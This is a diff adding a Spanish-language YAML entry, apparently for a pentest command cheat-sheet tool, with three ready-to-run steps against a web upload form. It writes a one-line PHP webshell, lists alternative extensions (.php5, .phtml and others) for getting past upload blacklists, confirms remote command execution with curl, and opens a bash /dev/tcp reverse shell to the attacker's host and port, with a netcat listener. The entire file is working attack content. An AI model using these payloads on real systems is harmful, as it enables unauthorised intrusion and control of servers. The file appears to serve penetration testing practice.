@@ -1,0 +1,39 @@
+# Webshell PHP: subirla saltando el filtro de extensiones y usarla para RCE o reverse shell.
+tool: webshell
+area: web
+url: https://github.com/swisskyrepo/PayloadsAllTheThings
+commands:
+  - id: webshell-php
+    title: Webshell PHP mínima
+    cmd: |
+      echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php5
+    phase: initial-access
+    tags: [webshell, php, file-upload]
+    notes: >-
+      $_REQUEST acepta el comando por GET o por POST. Si el panel rechaza .php, prueba extensiones que
+      Apache también ejecuta como PHP: .php5, .php3, .php4, .phtml o .pht (la lista negra casi nunca
+      las cubre todas).
+    refs: [https://github.com/swisskyrepo/PayloadsAllTheThings]
+
+  - id: webshell-rce
+    title: Comprobar RCE desde la webshell
+    cmd: |
+      curl "http://{{RHOST}}/uploads/shell.php5?cmd=id"
+    phase: initial-access
+    tags: [webshell, rce]
+    notes: >-
+      Si devuelve uid=33(www-data), hay ejecución de comandos. Ajusta la ruta (/uploads/) a donde el
+      servidor guarde los ficheros subidos.
+    refs: [https://github.com/swisskyrepo/PayloadsAllTheThings]
+
+  - id: webshell-revshell
+    title: Reverse shell desde la webshell
+    cmd: |
+      curl -G "http://{{RHOST}}/uploads/shell.php5" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1'"
+    phase: initial-access
+    tags: [webshell, reverse-shell]
+    notes: >-
+      system() ejecuta con /bin/sh (dash), pero >& y /dev/tcp son de bash: por eso el bash -c.
+      --data-urlencode escapa el & y los espacios para que no rompan la URL. Pon antes un listener con
+      nc -lvnp.
+    refs: [https://github.com/swisskyrepo/PayloadsAllTheThings]
